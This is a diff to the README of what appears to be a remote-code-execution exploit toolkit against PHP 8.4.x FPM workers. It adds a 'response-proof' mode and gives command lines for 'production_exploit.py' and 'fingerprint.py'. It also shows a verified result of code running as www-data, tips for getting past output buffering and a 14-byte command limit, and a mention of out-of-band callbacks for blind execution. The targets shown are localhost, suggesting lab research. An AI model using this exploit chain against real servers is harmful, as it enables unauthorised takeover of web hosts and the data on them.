@@ -256,7 +256,7 @@ but will not auto-run one by version alone; pass `--profile` for the exact
 image/build, or calibrate it. This prevents the upstream minimal-build 8.4
 profile from being mistaken for the official `php:8.4.26-fpm` image.
 
-## Production PHP 8.4.26 chain (own implementation)
+## Production PHP 8.4.x chain (own implementation)
 
 `production_exploit.py` is our own A1/B1/A2/B2 implementation for:
 
@@ -290,11 +290,37 @@ python3 production_exploit.py \
     --host-proof /path/to/out/p1
 ```
 
-The target must already have a PHP page and `/out`; the exploit does not change
-the PHP configuration. The x86_64 path is verified. The aarch64 offsets are
-present but have not been verified on real ARM hardware. Concurrent-load
-behavior is still under test; the current pinning assumes requests are not
-competing for the final free worker.
+The target must already have a PHP page and `/out` only for file proof; the
+exploit does not change the PHP configuration. The x86_64 path is verified. The
+aarch64 offsets are present but have not been verified on real ARM hardware.
+Concurrent-load behavior is still under test; the current pinning assumes
+requests are not competing for the final free worker.
+
+### Proof without a target file
+
+The B2 HTTP response carries `system()` output. Because the stock INI sets
+`output_buffering=4096`, the command must emit more than 4 KiB before the buffer
+is flushed. `--response-proof` appends a marker and `seq 1 5000`, reads the B2
+response, and confirms the marker. No target file or host mount is required:
+
+```bash
+python3 production_exploit.py \
+    --host 127.0.0.1 --port 1337 --workers 1 \
+    --version 8.4.26 --response-proof
+```
+
+Verified result:
+
+```text
+PROOF: P2S_RCE
+UID: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The session chain has a 14-byte command limit; `--response-proof` uses
+`id;seq 1 5000` and checks for `uid=`. Both chains return success from the
+response body without creating a proof file. Out-of-band HTTP/DNS callbacks or
+a `sleep` delay remain usable when response output is suppressed, but require
+an external collector or timing comparison.
 
 HTTPS is supported for both the exploit and the worker-holder connections:
 
@@ -347,3 +373,11 @@ python3 fingerprint.py \
 Use `--production-workers` to pin a different production worker count; it
 defaults to `--workers`, then to one worker. Production runs require a writable
 `/out` mount and the matching host proof path.
+
+For response-only proof, add `--response-proof` and omit `--proof-file`:
+
+```bash
+python3 fingerprint.py \
+    -u http://127.0.0.1:1337/index.php \
+    --arch x86_64 --workers 1 --run --response-proof
+```
